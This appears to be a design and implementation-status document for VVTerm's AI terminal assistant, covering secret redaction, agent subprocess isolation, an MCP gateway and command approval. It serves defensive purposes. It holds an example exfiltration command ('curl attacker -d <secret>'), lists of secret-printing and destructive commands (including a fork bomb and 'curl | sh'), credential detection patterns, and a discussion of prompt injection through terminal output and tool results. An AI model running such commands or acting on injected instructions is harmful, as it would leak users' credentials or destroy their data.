# VVTerm — AI terminal assistant design document

> Status: **Implemented** on branch `feature/add-assistant-ai` (see [section 13](#13-implementation-status)) · Updated: 2026-10-29 · Author: Vũ Nguyễn Vũ

## Contents

1. [Overview](#1-overview)
2. [Feasibility](#2-feasibility)
3. [Architecture](#3-architecture)
4. [Secret policy](#4-secret-policy)
5. [Agent adapters](#5-agent-adapters)
6. [Command execution and approval](#6-command-execution-and-approval)
7. [Data model and settings](#7-data-model-and-settings)
8. [User interface](#8-user-interface)
9. [Package layout and API bindings](#9-package-layout-and-api-bindings)
10. [Testing](#10-testing)
11. [Roadmap](#11-roadmap)
12. [Risks and open questions](#12-risks-and-open-questions)
13. [Implementation status](#13-implementation-status)

---

## 1. Overview

While a host is open, the user can ask an assistant for help with what is on the terminal screen: explain an error, suggest the next command, diagnose a failing service. The assistant is **not** an API client with its own key. VVTerm starts the AI command-line tool the user already has and is signed in to (Claude Code, Codex CLI, Gemini CLI, and others) as a local subprocess, so the user's existing subscription is used and VVTerm never sees a token.

**Goals**

- Ask about the active terminal pane without leaving VVTerm.
- Use any supported CLI agent through one interface; the user picks which one.
- Guarantee, in code and not by prompt, that secrets are never sent to the agent and never shown in the assistant UI. Everything sensitive appears as `*******`.
- The assistant proposes commands; the user approves them. Nothing runs by itself.

**Non-goals (first release)**

- Autonomous multi-step execution without approval.
- Calling model APIs directly with API keys.
- Running the agent on the remote host. The agent always runs on the user's computer.
- Guaranteeing that every possible secret is detected (see [4.6](#46-limits)).

## 2. Feasibility

| Question | Answer |
|---|---|
| Can a CLI agent be driven from Go? | Yes. `claude -p --output-format stream-json`, `codex exec`, and `gemini -p` are non-interactive and stream output. `internal/localtty` already spawns local processes. |
| Does it use the subscription? | Yes. Each CLI authenticates itself; VVTerm only spawns it. VVTerm must never read or copy the CLI's OAuth token. |
| Can the screen be read? | Yes. xterm.js keeps a text buffer; `SessionService` already sees all output. |
| Can commands be sent? | Yes. `SessionService.Write(sid, data)` is the same path keystrokes use. |
| Is Antigravity supported? | Unverified: no stable headless CLI was found. It is supported only through the generic "custom command" adapter ([5.3](#53-custom-command-adapter)). |

## 3. Architecture

The feature follows the layering of [CleanArchitecture.md](CleanArchitecture.md).

```
frontend: AssistantPanel (React)
   │  Wails binding (AssistantService)
   ▼
usecase.AssistantService ──► port Agent (accepts only domain.Sanitized)
   │          │                      ▲
   │          └─ uses ─► domain/secretpolicy (pure)        adapters: internal/agentx
   ▼
usecase.SessionService.Write  (only after approval)
```

Three guards sit on the only paths that cross a trust boundary:

```
Terminal buffer ─► [1 EGRESS] ─► Agent subprocess
UI / chat / logs ◄─ [2 INGRESS] ◄─ Agent reply
Insert / Run     ─► [3 COMMAND] ─► SessionService.Write
```

- `domain/secretpolicy` is pure Go with no I/O, so it is easy to test exhaustively.
- `usecase.AssistantService` orchestrates: build context, call guard, call agent, call guard, return a reply.
- `internal/agentx` implements the `Agent` port with subprocess adapters. `usecase` never imports it; `archtest` keeps that true.

## 4. Secret policy

The policy is a mandatory layer. It cannot be switched off, only made stricter. A prompt that tells the agent "do not reveal secrets" is not relied on: the agent can be wrong or manipulated, so enforcement lives in code at the boundaries the agent does not control.

### 4.1 Mask

Every redacted value is replaced by the fixed string `*******` (seven asterisks). The length does not depend on the secret, so length is not leaked. The same mask is used in the egress payload, the preview, the chat, command proposals, and the activity log.

### 4.2 Type-level enforcement

```go
// domain
type Sanitized struct{ text string }          // field not exported
func (s Sanitized) String() string { return s.text }
// Only secretpolicy.Guard.Redact can construct one.
```

The `Agent` port is `Ask(ctx, Request) (Reply, error)` where `Request` holds only `Sanitized` values. Passing a raw string does not compile. `archtest` additionally asserts that nothing outside `secretpolicy` constructs `Sanitized`.

### 4.3 The three guards

**Egress (terminal → agent).** Runs on the logical text of the buffer: wrapped rows are joined (`isWrapped`), so a secret that wraps over two rows is still matched. The result is `Sanitized` plus a list of findings (kind, count; never the value). **Fail-closed:** if redaction errors or times out, nothing is sent.

**Ingress (agent → UI).** The reply, including proposed commands and explanations, goes through the same guard before it is shown or stored. If the agent guesses or echoes a secret, the UI still shows `*******`.

**Command guard (agent → terminal).** A proposed command that contains the mask or a redaction placeholder cannot be run from the UI: the user must type it. VVTerm deliberately does **not** substitute real secrets back into commands, because that would let an injected agent exfiltrate them (for example `curl attacker -d <secret>`). Commands that are likely to print secrets (`cat .env`, `env`, `printenv`, `history`, `cat ~/.ssh/id_*`, `docker inspect`, and similar) get a warning; their output is redacted again when it returns to the agent.

### 4.4 Detection sources

In decreasing order of confidence:

1. **Exact vault match.** Every password, passphrase, and private key the vault holds, plus common encodings (base64, URL-encoded). This is exact string matching and is the most reliable source.
2. **Hidden input.** Text typed while the terminal has echo off (sudo, ssh password prompts) is never added to the context. The context is built from the output buffer, not from the keystroke log.
3. **Structured patterns.**
   - PEM blocks (`-----BEGIN ... PRIVATE KEY-----` to `END`)
   - AWS access key ids (`AKIA...`, `ASIA...`) and secret keys next to them
   - GitHub tokens (`ghp_`, `gho_`, `github_pat_`), GitLab (`glpat-`), Slack (`xox[baprs]-`)
   - `sk-...` style API keys
   - JWT (`eyJ....eyJ....sig`)
   - `Authorization: Bearer|Basic ...` headers
   - URLs with credentials (`scheme://user:pass@host`)
   - `NAME=value` and `name: value` pairs where the name matches `pass(word|wd)?|secret|token|api[_-]?key|private|credential|auth`
4. **Entropy heuristic.** Strings of 20 or more characters with high Shannon entropy that follow `=`, `:`, or a quote. Allow-list for non-secrets that look random: git SHAs, UUIDs, and docker image digests.
5. **User patterns.** Extra regular expressions in settings (can only add detectors, never remove built-in ones).

For pair patterns, only the value is masked and the name stays (`DB_PASSWORD=*******`) so the assistant can still reason about the configuration.

### 4.5 Subprocess isolation

The guard is pointless if the CLI can read the data another way, so the agent is started with:

- working directory = a fresh empty temporary directory, removed after the call;
- all file, shell, and web tools disabled (Claude: `--allowedTools ""` plus a deny list; Codex: read-only sandbox, no network tools; Gemini: no tools);
- a scrubbed environment: no `SSH_AUTH_SOCK`, no `VVTERM_*`, and no variable whose name matches the secret name pattern; only what the CLI needs to find its own login (`HOME`, `PATH`, locale);
- a timeout and an output size cap.

The only data channel into the agent is the redacted prompt, **plus the VVTerm MCP gateway when the user has added MCP servers** ([5.7](#57-mcp-servers-and-the-gateway)). The agent is never given an MCP server's own address or credentials; it can reach MCP tools only through the gateway, where the guards apply.

### 4.6 Limits

Pattern-based redaction is **best-effort**. A short human-chosen password written in free text ("the password is hunter2") has no structure to detect. The residual risk is reduced by exact vault matching, hidden-input exclusion, the preview, per-host switches, and the "Ask each time" mode ([7](#7-data-model-and-settings)). The README and the panel must state this limit and must not claim complete protection.

## 5. Agent adapters

### 5.1 Port

```go
type Agent interface {
    ID() string
    Detect(ctx context.Context) Status               // installed, version, supported, signed in (5.3)
    Models(ctx context.Context) ([]Model, error)     // read from the provider itself (5.4)
    Ask(ctx context.Context, r Request, emit func(Chunk)) (Reply, error)
}
```

`Request` carries the system instruction, the sanitized screen excerpt, host facts (OS, shell, user, environment tag), recent chat turns (already sanitized), and the user question. `Chunk` is a streamed piece of text.

### 5.2 Built-in adapters

| Agent | Invocation (sketch) | Notes |
|---|---|---|
| Claude Code | `claude -p --output-format stream-json --allowedTools "" --append-system-prompt ...` | Resume with `--resume` to cut start-up latency. |
| Codex CLI | `codex exec --sandbox read-only --json ...` | Prompt on stdin. |
| Gemini CLI | `gemini -p ...` | Tools disabled by flag or settings. |

Exact flags are verified per CLI version at implementation time; adapters report a clear error when a flag is not recognised, instead of falling back to a less safe invocation.

### 5.3 Provider detection

Providers are discovered at runtime, never assumed. `Detect()` runs on app start, when the Settings page opens, and on the Refresh button. It runs in the background with a short timeout per provider and never blocks the UI.

| Step | Check | Result |
|---|---|---|
| 1 | Find the binary on `PATH` plus the usual install folders (`~/.local/bin`, `/opt/homebrew/bin`, `/usr/local/bin`); a GUI app on macOS does not inherit the login shell `PATH`, so the user's login shell `PATH` is read once and cached. | `installed` / `not found` |
| 2 | Run `<bin> --version` (timeout 3 s). | Version string, compared with the adapter's minimum version. |
| 3 | Check the adapter's required flags are accepted (for example `--help` output contains the tool-disabling flag). | `supported` / `unsupported version` |
| 4 | Sign-in state, where the CLI offers a cheap offline check (a status command or the presence of its credential file, **checked for existence only, never read**). | `signed in` / `not signed in` / `unknown` |

Each provider has one status: `ready`, `needs sign-in`, `unsupported version`, `not installed`, or `disabled`. Detection never sends a prompt, so it costs no subscription usage. VVTerm does not sign the user in; the "needs sign-in" state shows the command to run in the terminal (for example `claude` or `codex login`).

### 5.4 Model discovery

The model list is **loaded from the provider itself**, never from a list hard-coded in VVTerm. `Models()` asks the provider's own tooling which models the signed-in account can use, so the list follows the user's subscription and new models appear without a VVTerm release. VVTerm adds no model names of its own.

How each provider is asked (verified against the installed CLIs on 2026-10-29: Claude Code 2.1.312, Codex 0.153.4, Gemini 0.44.1):

| Provider | Source | Status |
|---|---|---|
| Codex CLI | The model catalogue the CLI fetches from the provider and caches (`~/.codex/models_cache.json`: slug, display name, visibility, reasoning levels, context window). The adapter reads it **read-only** and ignores entries whose `visibility` is not listed. Preferred long-term source is the `codex app-server` protocol (experimental), which returns the same catalogue live; the adapter uses it when the installed version supports it and falls back to the cache file. | Verified: the file exists and carries the fields above. |
| Claude Code | The control protocol of the stream-json mode (`--input-format stream-json`): the initialize response lists the supported models for the account. | To verify in implementation: the CLI has no `models` subcommand, so this path must be confirmed against the installed version before it is relied on. |
| Gemini CLI | None found: `gemini --help` has `-m/--model` but no listing command. | Not available. |

The model is **chosen from the list, never typed**. `Default (CLI decides)` is always first and passes no model flag. When a provider cannot list its models the picker does **not** invent a list: it offers only `Default`, and the panel says the provider uses its default model. A model id that the provider did not list is refused when it is saved.

The list is cached in memory with a timestamp and refreshed by the Refresh button, by Settings opening, and when the cache is older than 24 hours. A failed refresh keeps the previous list and shows "Could not refresh models". Reading a catalogue never sends a prompt and costs no subscription usage. VVTerm reads only the model catalogue, never the credential files next to it (`auth.json` and similar).

If the CLI rejects a chosen model, the error is shown in the panel ("Model not available for this account") and the request is not retried with another model automatically.

### 5.5 Custom command adapter

For tools without a stable adapter (for example Antigravity), the user may configure a command template and whether the prompt is passed as an argument or on stdin. The same isolation rules in [4.5](#45-subprocess-isolation) apply and cannot be disabled. A custom provider is detected like the built-in ones (steps 1 and 2 only) and appears in the same list.

### 5.6 Structured reply

The agent is asked to answer in a small JSON envelope:

```json
{ "explanation": "...", "commands": [ { "cmd": "df -h", "why": "check disk usage", "risk": "low" } ] }
```

If the reply is not valid JSON it is shown as plain text with no runnable commands.

### 5.7 MCP servers and the gateway

The user can add MCP servers to the assistant (Settings → [8.2](#82-mcp-servers-page)): a documentation search, an issue tracker, a runbook store, and so on. MCP tools can read data and have side effects, and the agent calls them directly, so passing a server straight to the CLI would bypass every guard in [4](#4-secret-policy). Therefore:

**The agent never connects to a user MCP server. It connects only to the VVTerm gateway**, a loopback MCP server inside VVTerm (random port, per-request token, same pattern as [app/bridge.go](../app/bridge.go)). The gateway forwards allowed calls to the real servers, which VVTerm itself runs and holds credentials for.

```
Agent CLI ──► VVTerm gateway (loopback, token) ──► MCP server A (stdio, started by VVTerm)
                  │  [E] redact tool arguments                    MCP server B (HTTP)
                  │  [I] redact tool results
                  └─ allow-list, approval, size and rate limits, activity log
```

Each of the three guards applies at the gateway:

| Point | Rule |
|---|---|
| **Call arguments (egress)** | Arguments the agent sends to a server pass through the guard. A call whose arguments contain a secret is **blocked**, not masked, because a masked argument would silently change the meaning of the call. The agent receives "blocked: arguments contain sensitive data". |
| **Tool results (ingress)** | Results are untrusted text that may contain secrets or injected instructions. They are redacted (`*******`) before reaching the agent and the UI. Results over the size cap are truncated. |
| **Which tools exist** | Only tools the user has ticked are exposed. New tools that a server adds later are **off until approved**; the gateway shows "N new tools". |

Approval and limits:

- Each tool has a mode: `Allow`, `Ask each time` (a confirmation card in the panel showing the redacted arguments), or `Off`. A tool whose annotations mark it read-only (`readOnlyHint`) may default to `Allow`; every other tool defaults to `Ask`. These hints come from the server and are advisory, so a server the user has not marked **trusted** never gets `Allow` for a tool with side effects.
- A per-request cap on the number of tool calls, result size, and wall-clock time. Exceeding a cap ends the request with a message.
- The MCP servers are available only on hosts and requests where the assistant is on ([7](#7-data-model-and-settings)); a host set to `off` exposes nothing.
- Every call (server, tool, redacted arguments, outcome) goes to the activity log.

**How VVTerm talks to the user's servers**

- **stdio servers:** VVTerm starts the process itself with the command, arguments, and environment the user entered. The environment is built from the entries in the form only (no inheritance from VVTerm); secret values live in the vault, not in the database, and are never shown again after saving (`*******`). The working directory is the same empty temporary directory as for the agent.
- **HTTP servers:** URL plus optional headers, with header values stored in the vault. OAuth-based remote servers are out of scope for the first release.
- A server that fails to start or answer is shown as `Unavailable` and its tools are removed from the gateway, never retried silently in a loop.

**How the agent reaches the gateway.** Each adapter passes the gateway to its CLI through that CLI's own MCP option (for example a generated, temporary MCP config file that lists only the gateway, deleted after the call). Adapters must also disable the CLI's own MCP configuration (the user's global and project servers) for that call, so the agent sees the gateway and nothing else. If an adapter cannot do both, MCP is reported as unsupported for that provider; it is not enabled in a weaker form.

**Built-in terminal tools.** The `terminal_read` and `terminal_propose_command` tools of Phase 3 are served by the same gateway, so there is one enforcement point. `terminal_propose_command` produces a command card; it never runs a command itself ([6](#6-command-execution-and-approval)).

**Import.** The page can list MCP servers found in the CLIs' own configuration files, so the user does not retype them. Import is explicit and per server: VVTerm reads the file only after the user presses Import, shows what would be copied, moves any secret values into the vault, and never imports a server silently.

## 6. Command execution and approval

1. Commands appear as cards: command text, reason, risk badge.
2. **Insert** puts the command on the terminal prompt **without** pressing Enter. The user reads it in context and presses Enter themselves. This is the default action.
3. **Run** (insert + Enter) is available only after a confirmation click, and is hidden for commands that fail the command guard.
4. Risk is computed locally and is never taken from the agent's own `risk` field. Dangerous patterns (`rm -rf`, `dd`, `mkfs`, `chmod -R`, `> /dev/`, `:(){`, `shutdown`, `reboot`, `curl | sh`, `sudo`) raise the level to high and require typing the word `run`.
5. On hosts tagged production, Run is disabled; only Insert is offered.
6. Every inserted or run command is recorded in the activity log (redacted).

Auto-approve for an allow-list of read-only commands (`ls`, `df`, `uptime`, `journalctl -n`) and a multi-step loop through a loopback MCP server are later phases, not part of the first release.

## 7. Data model and settings

**Per host** (new column on the host, default `ask`):

| Value | Meaning |
|---|---|
| `off` | The assistant is unavailable for this host. Default for hosts tagged production. |
| `ask` | A confirmation shows what will be shared the first time per session. |
| `on` | The assistant works without the extra confirmation. |

**Global settings**

- **AI providers** page ([8.1](#81-settings-page)): the detected providers, each with an enable switch, status, version, and model refresh. The default provider and its default model.
- Number of buffer lines sent (default 200, maximum 1000).
- Extra redaction patterns (add-only).
- Chat history retention: in memory only (default) or stored redacted in the database.

MCP servers are stored in the database (name, type, command, arguments, URL, scope, per-tool modes, trusted flag); their secret values are stored in the vault. There is no setting that disables redaction, and none that lets an agent reach an MCP server without the gateway.

## 8. User interface

- **Panel.** A panel beside the terminal pane (right side). Layout alternatives (bottom overlay) are an open question ([12](#12-risks-and-open-questions)).
- **Header.** Provider picker and **model picker** (the list from [5.4](#54-model-discovery), with `Default` first; the choice is per panel and remembered per provider), host policy toggle, and the badge `Sharing screen · N items redacted`, always visible. The badge turns grey when sharing is off.
- **Preview.** A "What will be sent" button shows the exact redacted payload. Redacted values appear as `*******`.
- **Composer.** One line plus Send, with a "Use selection" shortcut that sends only the highlighted terminal text.
- **Replies.** Streamed text, then command cards ([6](#6-command-execution-and-approval)).
- **Banner.** If the guard fails, the panel shows "Not sent: redaction failed" and nothing leaves the machine.
- Follows the existing shortcut system ([shortcuts.ts](../frontend/src/lib/shortcuts/shortcuts.ts)); a new shortcut toggles the panel.

### 8.1 Settings page

Settings gets an **AI providers** page that lists every provider found by detection ([5.3](#53-provider-detection)), including custom ones:

| Column | Content |
|---|---|
| Name and version | For example `Codex CLI 0.153.4`. |
| Status | `Ready`, `Needs sign-in` (shows the command to run), `Unsupported version` (shows the minimum), `Not installed`. |
| Enabled | A switch. Only providers that are `Ready` can be switched on; an enabled provider that stops being ready is shown as unavailable but keeps its switch state. |
| Default model | A picker backed by [5.4](#54-model-discovery). |
| Refresh | Re-runs detection and model loading for that provider. |

Rules:

- A provider is **off until the user switches it on**, so installing a CLI never makes VVTerm start sending screens to it.
- The assistant panel offers only enabled, ready providers. **Switching** provider in the panel is immediate and applies from the next question; a running request is not moved to another provider.
- Exactly one provider is the default. Disabling the default picks the next enabled one, or leaves none and the panel shows "Enable a provider in Settings".
- Switching provider never carries chat history across: each provider is a different company receiving the data, so a new provider starts a new conversation and only the redacted current screen is sent.
- The page notes which company receives the redacted screen text for each provider.

### 8.2 MCP servers page

Settings → AI providers has an **MCP servers** tab next to the provider list. It is the place to add MCP servers actively:

- **Add server.** A form with name, type (`stdio` or `HTTP`), command and arguments or URL, environment variables or headers (value fields are masked and saved to the vault), and a **Trusted** checkbox that is off by default.
- **Test connection.** Starts the server, runs the MCP handshake, and lists its tools. Nothing is sent to an AI provider by a test.
- **Tools.** After a successful test the tools are listed with their description, a read-only badge when the server declares one, and a mode switch (`Allow`, `Ask each time`, `Off`). Everything starts at `Ask` or `Off` as described in [5.7](#57-mcp-servers-and-the-gateway).
- **Scope.** Each server is enabled globally or only for chosen hosts or groups, and can be limited to chosen providers.
- **Status.** `Connected`, `Unavailable` (with the error), `Disabled`, `New tools to review`.
- **Import.** Lists servers found in the CLIs' configuration and lets the user pick which to copy ([5.7](#57-mcp-servers-and-the-gateway)).
- **Warning text.** Each server's page states that its tool results are read by the AI provider after redaction, and that redaction is best-effort ([4.6](#46-limits)).

In the assistant panel, tool calls appear as collapsed steps ("Searched docs: *query*") and `Ask` calls appear as a confirmation card.

## 9. Package layout and API bindings

```
internal/domain/secretpolicy/     detectors, Guard, Sanitized   (pure)
internal/usecase/assistant_service.go   AssistantService, port Agent in ports.go
internal/agentx/                  claude.go, codex.go, gemini.go, custom.go, isolate.go
internal/mcpgw/                   gateway (loopback MCP server), client for stdio/HTTP servers, guard hooks
app/                              Wails bindings for AssistantService
frontend/src/lib/assistant/       AssistantPanel, CommandCard, PreviewDialog
```

Bound methods (sketch; MCP methods are listed after the table):

| Method | Purpose |
|---|---|
| `Providers()` | Detected providers with status, version, enabled flag. |
| `RefreshProviders(id?)` | Re-run detection and model loading. |
| `SetProviderEnabled(id, on)` | Switch a provider on or off (only if ready). |
| `Models(providerID)` | The model list from [5.4](#54-model-discovery). |
| `SetDefaults(providerID, model)` | Default provider and model. |
| `Preview(sid, lines)` | Return the redacted payload that would be sent. |
| `Ask(sid, question, opts)` | Start a request (`opts` includes provider and model); events `assistant:chunk:<id>` and `assistant:done:<id>`. |
| `Cancel(id)` | Stop a running request and kill the subprocess. |
| `SetHostPolicy(hostID, policy)` | Per-host switch. |

MCP management methods: `McpServers()`, `SaveMcpServer(server)`, `DeleteMcpServer(id)`, `TestMcpServer(id)` (returns the tool list), `SetMcpTool(serverID, tool, mode)`, `SetMcpScope(serverID, scope)`, `ImportableMcpServers()`, `ImportMcpServer(ref)`. Secret values are write-only: they go to the vault and no method returns them.

The screen text is pulled by the use case from a bounded output ring buffer kept in `session`; the frontend does not upload terminal text. `archtest` gets these rules: `usecase` must not import `agentx` or `mcpgw`, and only `secretpolicy` may construct `Sanitized`.

## 10. Testing

- **Detector corpus.** For each detector, positive samples (fabricated secrets) and negative samples (git SHAs, UUIDs, image digests, ordinary base64 data) to bound false positives.
- **Wrapped secrets.** A secret split across wrapped rows is still masked.
- **Vault exact match.** Seed a vault secret, print it in different encodings, and assert it is masked.
- **Type enforcement.** `archtest` rules above.
- **Fail-closed.** An injected guard error results in zero bytes written to the fake agent.
- **Isolation.** A fake CLI that records its cwd, environment, and arguments; assert the empty cwd, the scrubbed environment, and that tool-disabling flags are present.
- **Command guard.** A proposal containing the mask cannot be run; a proposal that matches a dangerous pattern needs the typed confirmation.
- **Detection.** A fake `PATH` with stub binaries covers `not installed`, old version, missing flag, and `ready`; detection never writes and never starts a prompt.
- **Model loading.** A fixture catalogue file yields the expected list, hidden entries are dropped, a provider with no listing returns only `Default` and `Custom`, and a failed refresh keeps the previous list. No credential file is opened (checked with a fake filesystem).
- **Provider switch.** Disabled providers are never offered or called; switching starts a new conversation with no history.
- **Gateway.** A call whose arguments hold a fabricated secret is blocked and never reaches the fake server; a result holding a secret reaches the fake agent masked; a new tool is not exposed until approved; an `Ask` tool waits for confirmation; caps end a runaway loop; a host set to `off` exposes no tools.
- **MCP isolation.** The CLI is started with a config listing only the gateway and with its own MCP configuration disabled (checked with the fake CLI); an adapter that cannot do this reports MCP as unsupported.
- **MCP secrets.** An environment value saved for a server is in the vault, absent from the database and from every binding result, and absent from the agent's environment and arguments.
- **End to end.** Print a file with secrets in a test SSH session (`internal/testssh`), ask a question, and assert the payload the fake agent received contains none of them.

## 11. Roadmap

| Phase | Scope | Estimate |
|---|---|---|
| 1 | `secretpolicy` and `Sanitized`; output ring buffer; isolation; Claude adapter; panel with preview, badge, and Insert; host policy | 3–4 days |
| 2 | Codex, Gemini, and custom adapters; streaming polish; Run with confirmation; risk levels; activity log | 2 days |
| 3 | `mcpgw` gateway with the built-in tools (`terminal_read`, `terminal_propose_command`), reusing the token and loopback pattern of [app/bridge.go](../app/bridge.go); per-step approval | 3–4 days |
| 3b | User-added MCP servers: MCP servers tab, stdio and HTTP clients, tool allow-list and modes, argument and result guards, import | 3–4 days |
| 4 | Read-only allow-list auto-approve | 1–2 days |

Phases 1 and 2 are the commitment of this document; 3, 3b, and 4 are decided after real use. MCP servers need the gateway, so 3b cannot ship before 3.

## 12. Risks and open questions

**Risks**

1. **Residual leakage.** See [4.6](#46-limits). Mitigated, not eliminated.
2. **Prompt injection.** Terminal output is untrusted and may contain instructions aimed at the agent. Mitigation: no agent tools, no auto-run, commands shown verbatim, real secrets never re-inserted.
3. **CLI drift.** Flags and output formats change between versions. Adapters verify the version and fail with a clear message instead of degrading safety.
4. **Latency.** Starting a CLI takes seconds; streaming and session resume reduce the perceived delay.
5. **Terms of service.** Only the official CLI, signed in by the user, is started. VVTerm never extracts or reuses its credentials.
6. **MCP servers widen the attack surface.** A user-added server may have side effects, return injected instructions, or be malicious. Mitigation: the gateway is the only path, tools are opt-in, side-effecting tools ask each time, arguments are blocked when they contain secrets, results are redacted, and servers are not trusted by default. A server the user starts is still code running with the user's privileges; the page says so.
7. **Full-screen applications** (vim, htop) produce noisy buffers. The assistant uses the normal buffer and, when the alternate screen is active, says so in the preview.

**Open questions**

1. Panel placement: right sidebar or bottom overlay.
2. Is chat history stored (redacted) in the database, or memory only? The draft default is memory only.
3. Gemini (and any provider without a listing) offers only `Default`. Resolved: the model is chosen from the provider's own list, never typed.
4. Should hosts tagged production be forced to `off`, or only default to it? The draft forces Run to be disabled but allows the assistant.
5. Does each CLI allow its own MCP configuration to be disabled while one gateway entry is added? This decides per provider whether MCP is supported ([5.7](#57-mcp-servers-and-the-gateway)).
6. Should the first release include HTTP servers, or only stdio servers? OAuth remote servers are excluded either way.
7. Which CLI versions are the minimum supported for each adapter? Decided when the adapters are written.

---

## 13. Implementation status

Everything in sections 1 to 11 is implemented except the items listed under *Not done*. The design above is kept as written; this section records what differs and what was actually verified.

### Verified against the real tools (this computer, 2026-10-29)

| Check | Result |
|---|---|
| Claude Code 2.1.312: detection (`--version`, required flags, `claude auth status`), models from the `initialize` control response (13 models), isolation self-test, a real question | Pass |
| Codex CLI 0.153.4: detection, models from its fetched catalogue (`visibility == "list"`), isolation self-test (`--disable shell_tool`), a real question | Pass |
| Claude Code through the gateway: the agent called a tool of a fake MCP server through the VVTerm gateway only; a `password=...` in the tool result was masked before the agent saw it | Pass |
| Gemini CLI 0.44.1 | Detected, but **not signed in with a usable method** on this computer (its settings select `gateway`), so the isolation self-test and a question could not run. The adapter is covered by fake-CLI tests only. |

Run the live checks yourself with `VVTERM_LIVE=1 go test ./internal/agentx -run Live -v` (a few tiny requests).

### Differences from the design

- **Package layout.** The pure rules live in `internal/domain/secretpolicy` and `internal/domain/assistant` (types, risk, reply parsing, screen text, MCP configuration types), so `usecase` and the adapters can share them without importing each other. `archtest` enforces: only `secretpolicy` builds `Sanitized`; `assistant.Request` holds only `Sanitized` text; `usecase` does not import `agentx` or `mcpgw`.
- **Isolation self-test on enable (new).** Turning a provider on asks it to run `hostname`; the provider is enabled only if it uses no tool and does not know the answer. It is repeated when the CLI version changes. This is what makes an adapter whose isolation cannot be checked in advance (Gemini, custom commands) safe to offer.
- **Claude isolation** uses `--tools ""`, `--strict-mcp-config`, `--disable-slash-commands`, `--no-session-persistence` and `--restricted` (which also ignores the user's settings files and hooks). `--bare` is not used: it cannot use the subscription login.
- **Models are read from the provider** as described in 5.4: Claude through its control protocol, Codex through its cached catalogue, Gemini cannot list. Codex's `app-server` is not used.
- **Gemini sign-in** is decided from the selected auth type in its settings (only "Login with Google" works, because the other methods need an API key or gateway from the environment, which VVTerm does not pass on) plus the existence of its sign-in file.
- **MCP through the gateway works for Claude Code only.** Codex and Gemini report `SupportsMCP() == false` because disabling their own MCP configuration while adding one gateway entry was not verified; they get the terminal text but no tools, as the design requires.
- **The UI chooses the request id** of a question, so it can listen for events before the question starts (the answer can begin before `Ask` returns).
- **Streaming** sends the whole text so far, cleaned again each time, so a secret split over two chunks is still masked; text that looks like the start of the JSON envelope is not shown.
- **Auto-run (phase 4)** is the `terminal_run` tool of the gateway, offered only when the user turned it on, never on production hosts, only for commands on the allow-list (`assistant.ReadOnlyAllowed`: no shell syntax, fixed programs, no follow or watch modes, nothing that looks like a secret path).
- **Activity log** has a new kind, `assistant`, with an *Assistant* filter on the Logs page.

### Added after the first review

- **Models are chosen, not typed.** The custom model id was removed; a failed load is retried (it is not remembered for a day), loads are single-flight per provider, and the panel shows *Loading models…* and a *Retry* button.
- **Chat box.** It grows with the text, shows suggestions in an empty chat, renders code blocks with a Copy button, and takes **files and screenshots** by drag and drop, paste and the paperclip.
  - **Text files** (up to 5, 100 KB each) are added to the context and go through the secret guard like the screen; the preview shows them redacted.
  - **Pictures** (up to 3, 5 MB each; PNG, JPEG, GIF, WebP, checked by content) **cannot be checked for secrets**, so they are the one thing an agent receives unredacted. They are sent only after the user confirms each time, only to a provider that takes pictures (Claude Code and Codex, both verified live with a test picture), and the activity log records that pictures were sent as they are. `assistant.ConfirmedImage` can only be built by `ConfirmImage`, and `archtest` enforces it.
- **Locking the vault closes the Settings window** (it shows security options and the providers), whether the user locked it or the inactivity timer did.
- **No white flash when Settings opens:** the page paints its background before any script loads, the last appearance is remembered, and the Settings web view is transparent over the window colour.
- **Antigravity CLI (`agy`) is offered as a provider**, next to the Gemini CLI (a different tool with its own sign-in). It works headlessly (`agy --print --output-format stream-json`, `agy models`), but it applies the user's own allow-rules from `~/.gemini/antigravity-cli/settings.json`: on the test machine they allow `command(echo)` and Gmail and Calendar MCP tools, and `echo` really ran. So every call starts with session-only settings (`--settings`) that **deny** commands, MCP and file tools (a deny beats an allow-rule; verified: `echo` was then refused). A tool the CLI reports as done is a violation; an attempt that was refused is not (no answer then means "tried a tool, refused"). Verified live on the test machine: detection (sign-in is judged from `agy models`), 13 models, the isolation self-test, and a request to run `echo` that produced only a suggestion.
- **Why the Gemini CLI still says "Needs sign-in":** the Gemini CLI and Antigravity share `~/.gemini`, and Antigravity sets `security.auth.selectedType` to `gateway`, which the Gemini CLI does not support. VVTerm does not touch that file; the message now says so and points to Antigravity.
- **Confirmations are in the chat and only for what changes something.** Reading the screen to answer needs no confirmation: the default policy of a host is On (Off on production). A host can be set to *Ask first*, which shows the redacted preview as a card in the chat. Pictures are confirmed in a card too. A command that only reads runs with one click; a command that can change something (or may print secrets) asks in its card, and a risky one needs the word `run`. Nothing opens as a popup.
- **Terminal input methods:** text being composed (Vietnamese Telex, pinyin, kana) is shown at the cursor with the theme's colours inverted until it is committed.

### Not done

- **Skills** (user playbooks added to the prompt) were discussed but are not part of this document and are not implemented.
- **Chat history is kept in memory only.** The design allowed an option to keep it redacted in the database; there is no such option yet.
- **Windows and Linux** were not run. The process-group handling has a Windows stub.
- **The native app** was not launched: the interface is covered by Vitest tests on a fake backend and the Go side by unit and integration tests; the Playwright walkthrough was not extended.

### Defects the tests found while building it

A deadlock in `SetProviderModel` and another in the provider list when a custom provider exists (both took the configuration lock twice); activity entries of the new kind were silently dropped by the activity validator; deleted vault secrets stay as tombstones, so tests count live secrets; and the UI had no filter of its own for a half-written JSON answer.
